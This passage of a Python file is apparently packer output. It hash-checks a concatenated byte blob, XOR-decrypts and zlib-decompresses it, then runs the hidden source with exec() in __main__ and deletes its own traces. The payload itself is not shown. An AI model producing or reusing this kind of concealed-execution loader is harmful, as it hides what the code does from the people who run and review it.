_cveOKjqjT5l_Kh + _csCd21J4NkV9bv + _coFKTyDgVcXpJu + _cmd8VT8jtsOx5I + _cgLl1ATVSl_qY6 + _cyNt2tD8IOPtMO + _c_3fLyz2ZP4Y_c + _crcV4YpZioK1DQ + _csZIW6vKjUB640 + _ctGgzw9lDcmVpN + _cfsfNOaEYrYyoc + _cz9giCrL6nIwWw + _ck1DHOvVnV33ya + _czAobtOzApu5rd + _caBOcn8m7yeKq9 + _cbwvAx4SZtdWvr + _cqJ9rJmv9uTzfx + _cikp54VRVNfOVU + _ccPhqgRMsjzmSk + _cdp6YVbqX9D7oo + _citYEiAjMhN0B7 + _cl3295EDZVCSbo + _czzfI6zrmc05jp + _cnhocNAmxPP3Us + _cafomG5LMugCF1 + _chhEvEXiRx1hb6 + _cnSRyJI8zHjj_J + _cepoGh7zPDhYFQ + _cdGGWPTpnoSM7k + _czsRqzmbqhf2bH + _czOtUGPzSf5rOQ + _cewhxeD8sBoCEZ + _cjfy2wyr9neTD2 + _crNRIOqZ0Yt5Wd + _cbUPa0QtJRIpd2 + _coCWpGSI7DH7LR + _cd3Z3bTe0_3DZ_ + _cqDjErrhaLspp3 + _ct8Fbu5lZ0q8zS + _cs7z5KsB_YsIOq + _cqEN8Io9Auqo23 + _ciwk4HrhBdWK4N + _ci72xogpdZkpTl + _ckCGZynVRRlFSi + _cuuViII2mVaZhj + _cmjjRxizkReL5K + _cdM2kTYUw0XBre + _c_Q7Zqbcb32vN2 + _cwaavDuG0i7R7r + _ckaJ4MjIVa0FbP + _cdQalpWsRAP8Jm + _chGmYW9wwBzwyK + _ceAPsV8hkSwsQn + _c_2aRaqvITmzyz + _ciSPJIgBGpegdz + _cqnM12tpNO5qcK + _cgvOGXpRu1dEW3 + _ckRWJ2AZq5h3fk + _ce49PKfAxUoytv + _ckwkSIGiGIlXJ_ + _cvWNBvyUvIu3Hz + _cnn05Hdhomncpi + _cz5puaz9jH3rY5 + _ccGru39BPGE6SG + _cnqVXYc0jSXe5d + _ck1VrwFJLFaYyG + _cxVidQNMqeHyGO + _csIYEol9hle5QQ + _cwg1QneKqe0uSX + _cp7dpzt3ihcb1T + _cwUURPVR7h0biX + _ceG9uAohRFdyXu + _cqLSO9YxGj3L5V + _caUwqa4wjw9hGw + _cn1gJdSxWgj0uJ + _cszqcm2KEZXX4K + _cvksox2oH2bxpH + _csZNqHyP7x7g3U + _csqyz_ooeR6NA0 + _ceH9rejKIxetFR + _ckWMXNNBRlQLUt + _ctJHbTdEIKhNBi + _cqZDFfpWcRsoDI + _cuo4uVDvLbyDvz + _ct55UbRcYB8oIi + _cp9jwgSXnW1xgk + _csp_2VN8rgNP59 + _cpu4ubAY0lOiRD + _cotr0hKcJ9SVpR + _cza_D1N34ceFNr + _cxPI_39Jn4fgyl + _cmdY0e46u0RVha + _cieBSuuqrWiSh_ + _cd2fcp_lBGOLfN + _cup3j7H58P9Lu9 + _cdnzxyEZ3HnkIE + _cwK01n5_xfQpS4 + _csfGylXC7aACpO + _cjlaMHBoRbNMki + _cz5rYvjRXavpye + _cd_amcvDxNTnDL + _czdcHmmC64paSt + _ca1PYHsTZhE1jN + _caoyzYRog5U_Nw + _cdwNR79Pey51bH + _cuGAr_EKX4ggY2 + _cfhB5HLwsHzPBh + _copRum1OfTGYLn + _cwWa3Uupae07oh + _cegzbSCrbegnvr + _cfOPJWpkQK9X6H + _cv8Ol3jxJkf7Qs + _ctITrP8yznZJMk + _cz1WoNUSwels5U + _cwkXfulscP4oCn + _curlUxkGNhzXTn + _cviQEhFzJ1bU_A + _cwmw8xyOuh__Ao + _cin76tBzr2J5tp + _cvGNZ_9gjOXAth + _ckCtWeGfDbhzpU + _cfPfsOfmGnctQR + _cnHD0TiYR2IJ7Z + _cuPBaur1R6ifqe + _cibLbdaIj58ISs + _cb9oxZkNNJvXdZ + _cvgQtD8DFMjcjm + _cnIN8f6iGxqzCf + _ceqHFIwnx2ld7s + _cawILTB77MZ0Ei + _cuzYuQmlT0v367 + _cj7OyHeFnfW_BT)
if __import__('hashlib').sha256(_pno3zaRvmIoNwm).hexdigest() != 'f5827593be81246882edca3e5d45b026a7cedd9ebada5b069a14786545b1193f':
    __import__('sys').exit(1)
_xsTOMo4YIZWkt5 = bytes([206, 168, 141, 14, 194, 104, 53, 170, 133, 215, 247])
_fkkaoIy1YTXT_pa = bytes([40, 90, 201, 174, 76, 120, 102, 190, 64, 156, 158])

def _fxnP1aIjRjHTmY3(_bjPCLC3WnnNHt3, _kdExP7Hqk27yMw):
    return bytes(_bjPCLC3WnnNHt3[_iaghrK1d3OehqM] ^ _kdExP7Hqk27yMw[_iaghrK1d3OehqM % len(_kdExP7Hqk27yMw)] for _iaghrK1d3OehqM in range(len(_bjPCLC3WnnNHt3)))

def _fde4lAdujLTKaxp(_tqPjbnE2K9bzUw):
    import zlib
    return zlib.decompress(_tqPjbnE2K9bzUw) # Un seul niveau de zlib ici pour simplifier

def _fe_qAl1rSJXkots():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xgFxvlpnsfeykw = _fxnP1aIjRjHTmY3(_pno3zaRvmIoNwm, _xsTOMo4YIZWkt5)
    # 2. Décompression Zlib
    _dsdvoJMy41wGbP = _fde4lAdujLTKaxp(_xgFxvlpnsfeykw)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dsdvoJMy41wGbP.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nuLXHmtyJ4Oozy = _main.__dict__
    _nuLXHmtyJ4Oozy.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nuLXHmtyJ4Oozy)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fe_qAl1rSJXkots()
try:
    del _fxnP1aIjRjHTmY3, _fde4lAdujLTKaxp, _fe_qAl1rSJXkots
    del _pno3zaRvmIoNwm, _xsTOMo4YIZWkt5, _fkkaoIy1YTXT_pa
except:
    pass
